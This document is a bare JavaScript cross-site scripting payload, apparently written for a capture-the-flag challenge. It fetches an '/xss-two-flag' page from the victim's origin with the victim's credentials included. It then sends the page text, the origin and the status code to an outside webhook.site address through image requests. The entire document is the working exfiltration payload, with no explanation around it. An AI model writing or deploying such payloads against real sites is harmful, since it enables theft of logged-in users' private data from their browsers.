(async () => {
  const hook = 'https://webhook.site/a258ded4-e428-4f12-8023-ea9e69072dde';

  const send = (key, value) => {
    new Image().src = hook + '?' + key + '=' + encodeURIComponent(value);
  };

  try {
    const target = location.origin + '/xss-two-flag';
    const res = await fetch(target, {
      credentials: 'include'
    });

    const text = await res.text();

    send('origin', location.origin);
    send('status', String(res.status));
    send('flag', text);
  } catch (e) {
    send('origin', location.origin);
    send('err', String(e));
  }
})();